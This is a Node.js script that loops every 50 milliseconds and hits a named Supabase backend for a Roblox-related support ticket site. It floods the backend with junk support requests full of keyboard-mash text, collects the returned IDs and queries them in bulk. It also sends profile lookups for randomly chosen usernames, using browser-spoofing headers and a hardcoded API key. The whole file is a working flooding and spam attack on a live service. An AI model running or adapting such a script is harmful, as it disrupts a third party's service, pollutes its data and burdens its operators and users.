const safeFetch = async (url, options = {}) => {
  try {
    const response = await fetch(url, options);

    return {
      ok: true,
      status: response.status,
      response,
    }
  } catch (error) {
    return {
      ok: false,
      status: null,
      error: error?.cause?.code ?? error?.code ?? error.name,
      message: error.message,
    }
  }
}

let ids = []
const users = ["Roblox", "Kreekcraft", "TmBe_34", "danhbeo", "ocean102300", "embecubegaming123", "khoinguyencolong", "dcbnwlbrother", "kenbatu1"]

setInterval(async () => {

    safeFetch("https://nepumajhiihqzpvuoqhr.supabase.co/rest/v1/topics?select=*&order=sort_order.asc", {
        "headers": {
            "accept-profile": "public",
            "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcHVtYWpoaWlocXpwdnVvcWhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgyNzU5MTcsImV4cCI6MjEwMzg1MTkxN30.hZy4tids6Nvy8yvfdJe-lPifjJ6cgxGrcaGrlT3-nf4",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcHVtYWpoaWlocXpwdnVvcWhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgyNzU5MTcsImV4cCI6MjEwMzg1MTkxN30.hZy4tids6Nvy8yvfdJe-lPifjJ6cgxGrcaGrlT3-nf4",
            "sec-ch-ua": "\"Chromium\";v=\"152\", \"Not?A_Brand\";v=\"24\", \"Google Chrome\";v=\"152\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "x-client-info": "supabase-js-web/2.57.4",
            "Referer": "https://roticket.com/"
        },
        "body": null,
        "method": "GET"
    })

    safeFetch("https://nepumajhiihqzpvuoqhr.supabase.co/rest/v1/rpc/create_support_request", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcHVtYWpoaWlocXpwdnVvcWhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgyNzU5MTcsImV4cCI6MjEwMzg1MTkxN30.hZy4tids6Nvy8yvfdJe-lPifjJ6cgxGrcaGrlT3-nf4",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcHVtYWpoaWlocXpwdnVvcWhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgyNzU5MTcsImV4cCI6MjEwMzg1MTkxN30.hZy4tids6Nvy8yvfdJe-lPifjJ6cgxGrcaGrlT3-nf4",
            "content-profile": "public",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"152\", \"Not?A_Brand\";v=\"24\", \"Google Chrome\";v=\"152\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "x-client-info": "supabase-js-web/2.57.4",
            "Referer": "https://roticket.com/"
        },
        "body": "{\"p_topic_id\":\"\",\"p_username\":\"Roblox\",\"p_subject\":\"jfe89hmre78hgue8su78y87y87y78yfh8dfyh8eruh890gsreuj89UMESHUSRhuru89ruh9USE890UEUHSF\",\"p_body\":\"Username: dfggggggggdffghfgdhf\\nReason: dsGYU8USAdhF8ahU8GUDSHG8wegH78EWGHJWE8R9GHW48E7UTGY8(aejy&*ewtgYE8WTGHJW87EGTUJEW8gjyew*(gUWE89Gyew*(GUwe*()tguwe*(gyew*FUJe*jmyew*tgyjwe89GUYWe*(gumew*gw&*gjyewFI(afu*wqe)f(ewuf*)weug(em *f)eaumf9me*ungfyE90mghe*(i)gmhues*)FJM9eamfje*suew*()gmuwe*gymEW89GUMJea*)fUMse*FUJes*(FdsGYU8USAdhF8ahU8GUDSHG8wegH78EWGHJWE8R9GHW48E7UTGY8(aejy&*ewtgYE8WTGHJW87EGTUJEW8gjyew*(gUWE89Gyew*(GUwe*()tguwe*(gyew*FUJe*jmyew*tgyjwe89GUYWe*(gumew*gw&*gjyewFI(afu*wqe)f(ewuf*)weug(em *f)eaumf9me*ungfyE90mghe*(i)gmhues*\"}",
        "method": "POST"
    }).then(r => r.response?.text()).then(r => {
        if (ids.length < 5000) ids.push(r)
        else ids.length = 0
    })

    safeFetch("https://nepumajhiihqzpvuoqhr.supabase.co/rest/v1/rpc/get_requests_by_ids", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcHVtYWpoaWlocXpwdnVvcWhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgyNzU5MTcsImV4cCI6MjEwMzg1MTkxN30.hZy4tids6Nvy8yvfdJe-lPifjJ6cgxGrcaGrlT3-nf4",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcHVtYWpoaWlocXpwdnVvcWhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgyNzU5MTcsImV4cCI6MjEwMzg1MTkxN30.hZy4tids6Nvy8yvfdJe-lPifjJ6cgxGrcaGrlT3-nf4",
            "content-profile": "public",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"152\", \"Not?A_Brand\";v=\"24\", \"Google Chrome\";v=\"152\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "x-client-info": "supabase-js-web/2.57.4",
            "Referer": "https://roticket.com/"
        },
        "body": JSON.stringify({ "p_ids": ids }),
        "method": "POST"
    })

    safeFetch("https://nepumajhiihqzpvuoqhr.supabase.co/functions/v1/roblox-profile", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcHVtYWpoaWlocXpwdnVvcWhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgyNzU5MTcsImV4cCI6MjEwMzg1MTkxN30.hZy4tids6Nvy8yvfdJe-lPifjJ6cgxGrcaGrlT3-nf4",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"152\", \"Not?A_Brand\";v=\"24\", \"Google Chrome\";v=\"152\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "Referer": "https://roticket.com/"
        },
        "body": `{\"username\":\"${users[Math.floor(Math.random() * users.length)]}\"}`,
        "method": "POST"
    })

    process.stdout.cursorTo(0,0)
    process.stdout.write(`
Request Ids length: ${ids.length}
`.trim())
}, 50)